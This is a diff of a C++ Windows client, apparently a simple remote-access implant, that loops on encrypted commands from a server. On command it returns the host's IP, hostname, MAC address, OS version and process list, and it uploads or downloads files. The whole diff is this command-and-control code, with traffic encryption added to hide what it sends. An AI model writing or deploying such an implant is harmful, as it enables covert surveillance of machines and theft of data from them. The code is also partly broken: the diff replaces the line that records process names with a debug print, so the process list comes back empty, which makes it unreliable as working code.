@@ -343,7 +343,8 @@ vector<wstring> getRunningProcesses()
 
                 if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)))
                 {
-                    processNames.push_back(szProcessName);
+                    //processNames.push_back(str);
+                    printf("error here @ 346");
                 }
             }
 
@@ -417,150 +418,156 @@ int main(int argc, char* arg[]) {
     //  RUNNING PROCESSES
     //  UPLOAD
     //  DOWNLOAD
+    for (;;) {
+        char buffer[200];
+        
+        //Receive command from server    
+        int byteCount = recv(clientSocket, buffer, 200, 0);
+        
+        //Convert buffer to a readable string to compare inside the if statements
+        //string str(buffer); // buffer is already a char array - will otherwise be encoded incorrectly
+        printf("\nencrypted received command: %s\n", buffer);
+        
+        string decryptedBuff = decrypt(string(buffer));
+        strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
+        buffer[decryptedBuff.size()] = '\0';
+        printf("\nreceived command: %s\n", buffer);
 
-    char buffer[200];
-    
-    //Receive command from server    
-    int byteCount = recv(clientSocket, buffer, 200, 0);
-    
-    //Convert buffer to a readable string to compare inside the if statements
-    string str(buffer);
-    if (byteCount > 0) {
-        if (str == "IPADDRESS") {
-            //Send IP Address
+        if (byteCount > 0) {
+            if (strstr(buffer, "IPADDRESS")) {
+                //Send IP Address
+                string ipAddress = getIpAddress();
+                if (ipAddress != "") {
+                    // const char* msg = ipAddress.c_str();
+                    // int bytesSent = send(clientSocket, msg, strlen(msg), 0);
+                    
+                    // encode ip
+                    string encryptedIpAddress = encrypt(ipAddress);
+                    int bytesSent = send(clientSocket,encryptedIpAddress.c_str(), encryptedIpAddress.size(), 0);
+                    
+                    if (bytesSent == SOCKET_ERROR) {
+                        cout << "Error at send(): " << WSAGetLastError() << endl;
+                        WSACleanup();
+                        return 0;
+                    }
+                    else {
+                        cout << "Message sent to server: " << encryptedIpAddress << endl;
+                    }
+                }
+            }
+            else if (strstr(buffer, "USERNAME")) {
+                //Send Hostname
 
-            string ipAddress = getIpAddress();
-            if (ipAddress != "") {
-                // const char* msg = ipAddress.c_str();
-                // int bytesSent = send(clientSocket, msg, strlen(msg), 0);
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+                DWORD size = sizeof(hostname) / sizeof(char);
+
+                if (GetComputerNameA(hostname, &size)) {
+                    // cout << "Message sent to server: " << hostname << endl;
+                    // send(clientSocket, hostname, strlen(hostname), 0);
+                    
+                    // encode hostname
+                    string encryptedHostname = encrypt(string(hostname));
+                    int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
+                }
+                else {
+                    cout << "Could not send hostname. Error: " << GetLastError << endl;
+                }
+            }
+            else if (strstr(buffer, "MACADDRESS")) {
+                //Send MAC Address
+
+                string MacAddress = getMacAddress();
+                if (MacAddress != "") {
+                    // const char* macmsg = MacAddress.c_str();
+                    // int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
+                    
+                    // encode mac
+                    string encryptedMacAddress = encrypt(MacAddress);
+                    int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
+                    
+                    if (bytesSent == SOCKET_ERROR) {
+                        cout << "Error at send(): " << WSAGetLastError() << endl;
+                        WSACleanup();
+                        return 0;
+                    }
+                    else {
+                        cout << "Message sent to server: " << endl;// << macmsg << endl;
+                    }
+                }
+            }
+            else if (strstr(buffer, "OS VERSION")) {
+                //Send OS Version
+
+                string osMessage = getOS();
+                // int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
                 
-                // encode ip
-                string encryptedIpAddress = encrypt(ipAddress);
-                int bytesSent = send(clientSocket,encryptedIpAddress.c_str(), encryptedIpAddress.size(), 0);
+                // encode os
+                string encryptedOsMessage = encrypt(osMessage);
+                int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
                 
                 if (bytesSent == SOCKET_ERROR) {
-                    cout << "Error at send(): " << WSAGetLastError() << endl;
+                    cout << "Error while sending OS: " << WSAGetLastError() << endl;
+                }
+                else {
+                    cout << "Message sent to server: " << osMessage << endl;
+                }
+            }
+            else if (strstr(buffer, "RUNNING PROCESSES")) {
+                //Send Running Processes
+
+                vector<wstring> processes = getRunningProcesses();
+                string result = "Running processes: \n";
+                for (const auto& process : processes) {
+                    result += string(process.begin(), process.end()) + "\n";
+                }
+
+                // int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
+                
+                // encode running processes
+                string encryptedResult = encrypt(result);
+                int bytesSent = send(clientSocket, encryptedResult.c_str(), encryptedResult.length(), 0);
+                
+                if (bytesSent == SOCKET_ERROR) {
+                    cout << "Error while sending running processes: " << WSAGetLastError() << endl;
                     WSACleanup();
                     return 0;
                 }
-                else {
-                    cout << "Message sent to server: " << msg << endl;
-                }
             }
-        }
-        else if (str == "USERNAME") {
-            //Send Hostname
-
-            char hostname[MAX_COMPUTERNAME_LENGTH + 1];
-            DWORD size = sizeof(hostname) / sizeof(char);
-
-            if (GetComputerNameA(hostname, &size)) {
-                // cout << "Message sent to server: " << hostname << endl;
-                // send(clientSocket, hostname, strlen(hostname), 0);
-                
-                // encode hostname
-                string encryptedHostname = encrypt(string(hostname));
-                int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
-            }
-            else {
-                cout << "Could not send hostname. Error: " << GetLastError << endl;
-            }
-        }
-        else if (str == "MACADDRESS") {
-            //Send MAC Address
-
-            string MacAddress = getMacAddress();
-            if (MacAddress != "") {
-                // const char* macmsg = MacAddress.c_str();
-                // int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
-                
-                // encode mac
-                string encryptedMacAddress = encrypt(MacAddress);
-                int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
-                
-                if (bytesSent == SOCKET_ERROR) {
-                    cout << "Error at send(): " << WSAGetLastError() << endl;
-                    WSACleanup();
+            else if (strstr(buffer, "UPLOAD")) {
+                string fileData = upload(uploadPath, clientSocket);
+                if (fileData.empty()) {
+                    cerr << "Error: upload failed - file empty" << endl;
                     return 0;
                 }
                 else {
-                    cout << "Message sent to server: " << macmsg << endl;
+                    resultInt = send(clientSocket, fileData.c_str(), fileData.size(), 0);
+                    if (resultInt == SOCKET_ERROR) {
+                        cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
+                        closesocket(clientSocket);
+                        WSACleanup();
+                        return 0;
+                    }
+                    cout << "File uploaded successfully." << endl;
                 }
             }
-        }
-        else if (str == "OS VERSION") {
-            //Send OS Version
-
-            string osMessage = getOS();
-            // int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
-            
-            // encode os
-            string encryptedOsMessage = encrypt(osMessage);
-            int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
-            
-            if (bytesSent == SOCKET_ERROR) {
-                cout << "Error while sending OS: " << WSAGetLastError() << endl;
-            }
-            else {
-                cout << "Message sent to server: " << osMessage << endl;
-            }
-        }
-        else if (str == "RUNNING PROCESSES") {
-            //Send Running Processes
-
-            vector<wstring> processes = getRunningProcesses();
-            string result = "Running processes: \n";
-            for (const auto& process : processes) {
-                result += string(process.begin(), process.end()) + "\n";
-            }
-
-            // int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
-            
-            // encode running processes
-            string encryptedResult = encrypt(result);
-            int bytesSent = send(clientSocket, encryptedResult.c_str(), encryptedResult.length(), 0);
-            
-            if (bytesSent == SOCKET_ERROR) {
-                cout << "Error while sending running processes: " << WSAGetLastError() << endl;
-                WSACleanup();
-                return 0;
-            }
-        }
-        else if (str == "UPLOAD") {
-            string fileData = upload(uploadPath, clientSocket);
-            if (fileData.empty()) {
-                cerr << "Error: upload failed - file empty" << endl;
-                return 0;
-            }
-            else {
-                resultInt = send(clientSocket, fileData.c_str(), fileData.size(), 0);
-                if (resultInt == SOCKET_ERROR) {
-                    cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
+            else if (strstr(buffer, "DOWNLOAD")) {
+                string fileData = download(clientSocket, downloadPath);
+                if (!fileData.empty()) {
+                    cout << "File did not download correctly" << endl;
+                    cout << fileData << endl;
                     closesocket(clientSocket);
                     WSACleanup();
                     return 0;
                 }
-                cout << "File uploaded successfully." << endl;
+                else {
+                    cout << "File downloaded successfully" << endl;
+                }
             }
         }
-        else if (str == "DOWNLOAD") {
-            string fileData = download(clientSocket, downloadPath);
-            if (!fileData.empty()) {
-                cout << "File did not download correctly" << endl;
-                cout << fileData << endl;
-                closesocket(clientSocket);
-                WSACleanup();
-                return 0;
-            }
-            else {
-                cout << "File downloaded successfully" << endl;
-            }
+        else {
+            WSACleanup();
         }
     }
-    else {
-        WSACleanup();
-    }
-
     //Close the socket
     system("pause");
     WSACleanup();
